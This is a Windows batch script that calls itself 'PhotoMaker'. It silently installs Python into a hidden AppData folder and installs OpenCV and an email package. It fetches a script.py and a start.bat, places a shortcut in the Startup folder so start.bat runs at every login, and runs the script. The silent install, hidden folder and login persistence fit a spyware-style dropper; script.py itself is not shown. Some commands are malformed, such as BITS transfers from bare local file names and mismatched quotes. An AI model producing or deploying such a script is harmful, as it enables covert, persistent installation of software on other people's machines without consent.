@echo off
cd "%USERPROFILE%\AppData\Local" 
mkdir "PhotoMaker"
cd "PhotoMaker"
powershell Start-BitsTransfer -Source "https://www.python.org/ftp/python/3.6.4/python-3.6.4.exe" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\python-3.6.4.exe"
python-3.6.4.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
del "%USERPROFILE%\AppData\Local\PhotoMaker\python-3.6.4.exe"
pip install opencv-python
pip install email
powershell Start-BitsTransfer -Source "script.py" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\script.py"
powershell Start-BitsTransfer -Source "start.bat" -Destination "%USERPROFILE%\AppData\Local\PhotoMaker\start.bat"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('"%USERPROFILE%\Start Menu\Programs\Startup\start.lnk");$s.TargetPath="start.bat";$s.Save()"
py -3 "%USERPROFILE%\AppData\Local\PhotoMaker\script.py"
